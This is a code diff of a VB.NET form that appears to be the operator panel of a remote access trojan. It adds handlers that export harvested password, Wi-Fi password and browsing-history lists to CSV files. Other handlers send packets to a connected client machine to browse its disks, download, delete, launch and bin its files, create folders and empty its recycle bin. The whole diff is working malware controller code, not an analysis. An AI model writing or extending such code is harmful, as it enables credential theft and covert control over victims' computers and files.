@@ -380,63 +380,248 @@ Public Class Client_Form
         Await Task.Run(Sub() C.Sender(P))
     End Sub
 
-    Private Sub CSV_W_PW_Click(sender As Object, e As EventArgs) Handles CSV_W_PW.Click
-        Dim AddFile As New Thread(Sub()
-                                      Using ofd = New SaveFileDialog()
-                                          ofd.DefaultExt = ".csv"
-                                          ofd.Filter = ".csv (*.csv)|*.csv"
-                                          Dim Action As DialogResult = ofd.ShowDialog()
-                                          If Action = DialogResult.OK Then ' 
+    Private Async Sub CSV_W_PW_Click(sender As Object, e As EventArgs) Handles CSV_W_PW.Click
+        Await Task.Run(Sub()
+                           Dim AddFile As New Thread(Sub()
+                                                         Using ofd = New SaveFileDialog()
+                                                             ofd.DefaultExt = ".csv"
+                                                             ofd.Filter = ".csv (*.csv)|*.csv"
+                                                             Dim Action As DialogResult = ofd.ShowDialog()
+                                                             If Action = DialogResult.OK Then ' 
 
-                                              Utilities.Utils.ListViewToCSV.ToCSV(W_PW_ListView, ofd.FileName)
+                                                                 Utilities.Utils.ListViewToCSV.ToCSV(W_PW_ListView, ofd.FileName)
 
-                                          End If
-                                      End Using
+                                                             End If
+                                                         End Using
 
 
-                                  End Sub)
+                                                     End Sub)
 
-        AddFile.SetApartmentState(ApartmentState.STA)
-        AddFile.Start()
+                           AddFile.SetApartmentState(ApartmentState.STA)
+                           AddFile.Start()
+                       End Sub)
     End Sub
 
-    Private Sub CSV_HISTORY_Click(sender As Object, e As EventArgs) Handles CSV_HISTORY.Click
-        Dim AddFile As New Thread(Sub()
-                                      Using ofd = New SaveFileDialog()
-                                          ofd.DefaultExt = ".csv"
-                                          ofd.Filter = ".csv (*.csv)|*.csv"
-                                          Dim Action As DialogResult = ofd.ShowDialog()
-                                          If Action = DialogResult.OK Then ' 
+    Private Async Sub CSV_HISTORY_Click(sender As Object, e As EventArgs) Handles CSV_HISTORY.Click
+        Await Task.Run(Sub()
+                           Dim AddFile As New Thread(Sub()
+                                                         Using ofd = New SaveFileDialog()
+                                                             ofd.DefaultExt = ".csv"
+                                                             ofd.Filter = ".csv (*.csv)|*.csv"
+                                                             Dim Action As DialogResult = ofd.ShowDialog()
+                                                             If Action = DialogResult.OK Then ' 
 
-                                              Utilities.Utils.ListViewToCSV.ToCSV(Hist_ListView, ofd.FileName)
+                                                                 Utilities.Utils.ListViewToCSV.ToCSV(Hist_ListView, ofd.FileName)
 
-                                          End If
-                                      End Using
+                                                             End If
+                                                         End Using
 
 
-                                  End Sub)
+                                                     End Sub)
 
-        AddFile.SetApartmentState(ApartmentState.STA)
-        AddFile.Start()
+                           AddFile.SetApartmentState(ApartmentState.STA)
+                           AddFile.Start()
+                       End Sub)
+
     End Sub
 
-    Private Sub CSV_PASSWORDS_Click(sender As Object, e As EventArgs) Handles CSV_PASSWORDS.Click
-        Dim AddFile As New Thread(Sub()
-                                      Using ofd = New SaveFileDialog()
-                                          ofd.DefaultExt = ".csv"
-                                          ofd.Filter = ".csv (*.csv)|*.csv"
-                                          Dim Action As DialogResult = ofd.ShowDialog()
-                                          If Action = DialogResult.OK Then ' 
+    Private Async Sub CSV_PASSWORDS_Click(sender As Object, e As EventArgs) Handles CSV_PASSWORDS.Click
 
-                                              Utilities.Utils.ListViewToCSV.ToCSV(Passwords_ListView, ofd.FileName)
+        Await Task.Run(Sub()
+                           Dim AddFile As New Thread(Sub()
+                                                         Using ofd = New SaveFileDialog()
+                                                             ofd.DefaultExt = ".csv"
+                                                             ofd.Filter = ".csv (*.csv)|*.csv"
+                                                             Dim Action As DialogResult = ofd.ShowDialog()
+                                                             If Action = DialogResult.OK Then ' 
 
-                                          End If
-                                      End Using
+                                                                 Utilities.Utils.ListViewToCSV.ToCSV(Passwords_ListView, ofd.FileName)
+
+                                                             End If
+                                                         End Using
 
 
-                                  End Sub)
+                                                     End Sub)
 
-        AddFile.SetApartmentState(ApartmentState.STA)
-        AddFile.Start()
+                           AddFile.SetApartmentState(ApartmentState.STA)
+                           AddFile.Start()
+                       End Sub)
+    End Sub
+
+    Private Async Sub GoForwardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GoForwardToolStripMenuItem.Click
+        If FM_ListView.SelectedItems.Count = 1 Then
+
+            If FM_ListView.SelectedItems(0).Tag = "FOLDER" Then
+
+                Dim NewPath As String = Path_Lab.Text & FM_ListView.SelectedItems(0).Text & "\"
+
+                Path_Lab.Text = NewPath
+                Dim P As New PacketMaker
+                P.Type_Packet = PacketType.PLUGIN
+                P.Plugin = Plugins._FM
+                P.Function_Params = New Object() {Packet_Subject.GET_FORWARD_PATH, NewPath}
+
+                Await Task.Run(Sub() C.Sender(P))
+
+            End If
+        End If
+    End Sub
+
+    Private Async Sub BackToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BackToolStripMenuItem.Click
+        'If FM_ListView.SelectedItems(0).Tag = "FOLDER" Then
+        If Path_Lab.Text.Length > 3 Then
+
+                Dim Splitter As String() = Split(Path_Lab.Text, "\")
+
+                Dim NewPath As String
+                For i = 0 To Splitter.Length - 3
+                    NewPath += Splitter(i) & "\"
+                Next
+
+
+                Path_Lab.Text = NewPath
+                Dim P As New PacketMaker
+                P.Type_Packet = PacketType.PLUGIN
+                P.Plugin = Plugins._FM
+                P.Function_Params = New Object() {Packet_Subject.GET_FORWARD_PATH, NewPath}
+
+                Await Task.Run(Sub() C.Sender(P))
+
+            End If
+
+        ' End If
+    End Sub
+
+    Private Async Sub MoveToBinToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles MoveToBinToolStripMenuItem1.Click
+        If FM_ListView.SelectedItems.Count = 1 Then
+            If FM_ListView.SelectedItems(0).Tag = "FILE" Then
+                Dim P As New PacketMaker
+                P.Type_Packet = PacketType.PLUGIN
+                P.Plugin = Plugins._FM
+                P.Function_Params = New Object() {Packet_Subject.PUT_BIN_FILE, Path_Lab.Text & FM_ListView.SelectedItems(0).Text}
+                Await Task.Run(Sub() C.Sender(P))
+            End If
+        End If
+    End Sub
+
+    Private Async Sub DeleteToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem1.Click
+        If FM_ListView.SelectedItems.Count = 1 Then
+            If FM_ListView.SelectedItems(0).Tag = "FILE" Then
+                Dim P As New PacketMaker
+                P.Type_Packet = PacketType.PLUGIN
+                P.Plugin = Plugins._FM
+                P.Function_Params = New Object() {Packet_Subject.DEL_FILE, Path_Lab.Text & FM_ListView.SelectedItems(0).Text}
+                Await Task.Run(Sub() C.Sender(P))
+            End If
+        End If
+    End Sub
+
+    Private Async Sub EmptyBinToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles EmptyBinToolStripMenuItem1.Click
+        Dim P As New PacketMaker
+        P.Type_Packet = PacketType.PLUGIN
+        P.Plugin = Plugins._MS
+        P.Function_Params = New Object() {Packet_Subject.EMPTY_BIN}
+        Await Task.Run(Sub() C.Sender(P))
+    End Sub
+
+    Private Async Sub DownloadFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadFileToolStripMenuItem.Click
+        If FM_ListView.SelectedItems.Count = 1 Then
+            If FM_ListView.SelectedItems(0).Tag = "FILE" Then
+                Dim P As New PacketMaker
+                P.Type_Packet = PacketType.PLUGIN
+                P.Plugin = Plugins._FM
+                P.Function_Params = New Object() {Packet_Subject.DW_FILE, Path_Lab.Text & FM_ListView.SelectedItems(0).Text}
+                Await Task.Run(Sub() C.Sender(P))
+            End If
+        End If
+    End Sub
+
+    Private Async Sub FM_ListView_DoubleClick(sender As Object, e As EventArgs) Handles FM_ListView.DoubleClick
+        If Disk_ComboBox.Items.Count > 0 Then
+            If FM_ListView.SelectedItems.Count = 1 Then
+
+                If FM_ListView.SelectedItems(0).Tag = "FOLDER" Then
+
+                    Dim NewPath As String = Path_Lab.Text & FM_ListView.SelectedItems(0).Text & "\"
+
+                    Path_Lab.Text = NewPath
+                    Dim P As New PacketMaker
+                    P.Type_Packet = PacketType.PLUGIN
+                    P.Plugin = Plugins._FM
+                    P.Function_Params = New Object() {Packet_Subject.GET_FORWARD_PATH, NewPath}
+
+                    Await Task.Run(Sub() C.Sender(P))
+
+                End If
+
+                If FM_ListView.SelectedItems(0).Tag = "FILE" Then
+                    Dim P As New PacketMaker
+                    P.Type_Packet = PacketType.PLUGIN
+                    P.Plugin = Plugins._FM
+                    P.Function_Params = New Object() {Packet_Subject.OPEN_FILE, Path_Lab.Text & FM_ListView.SelectedItems(0).Text}
+                    Await Task.Run(Sub() C.Sender(P))
+                End If
+
+            End If
+
+        End If
+
+    End Sub
+
+
+
+    Private Async Sub CreateDirectoryToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles CreateDirectoryToolStripMenuItem1.Click
+        If Disk_ComboBox.Items.Count > 0 Then
+            If FM_ListView.SelectedItems.Count = 0 Then
+
+                Dim NewDir As String = Path_Lab.Text & InputBox("Name of new dir :")
+                ' If FM_ListView.SelectedItems(0).Tag = "FOLDER" Then
+
+                Dim P As New PacketMaker
+
+                P.Type_Packet = PacketType.PLUGIN
+
+                P.Plugin = Plugins._FM
+                P.Function_Params = New Object() {Packet_Subject.MK_DIR, NewDir}
+
+                Await Task.Run(Sub() C.Sender(P))
+
+                ' End If
+            End If
+        End If
+    End Sub
+
+    Private Async Sub AllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AllToolStripMenuItem.Click
+        If Path_Lab.Text.Length > 0 Then
+            Dim P As New PacketMaker
+            P.Type_Packet = PacketType.PLUGIN
+            P.Plugin = Plugins._FM
+            P.Function_Params = New Object() {Packet_Subject.GET_DISK}
+
+            Await Task.Run(Sub() C.Sender(P))
+        End If
+    End Sub
+
+    Private Async Sub CurrentDirectoryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CurrentDirectoryToolStripMenuItem.Click
+        Dim NewPath As String = Path_Lab.Text
+        Path_Lab.Text = NewPath
+        Dim P As New PacketMaker
+        P.Type_Packet = PacketType.PLUGIN
+        P.Plugin = Plugins._FM
+        P.Function_Params = New Object() {Packet_Subject.GET_FORWARD_PATH, NewPath}
+
+        Await Task.Run(Sub() C.Sender(P))
+    End Sub
+
+    Private Async Sub LaunchToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles LaunchToolStripMenuItem1.Click
+        If FM_ListView.SelectedItems.Count = 1 Then
+            If FM_ListView.SelectedItems(0).Tag = "FILE" Then
+                Dim P As New PacketMaker
+                P.Type_Packet = PacketType.PLUGIN
+                P.Plugin = Plugins._FM
+                P.Function_Params = New Object() {Packet_Subject.OPEN_FILE, Path_Lab.Text & FM_ListView.SelectedItems(0).Text}
+                Await Task.Run(Sub() C.Sender(P))
+            End If
+        End If
     End Sub
 End Class
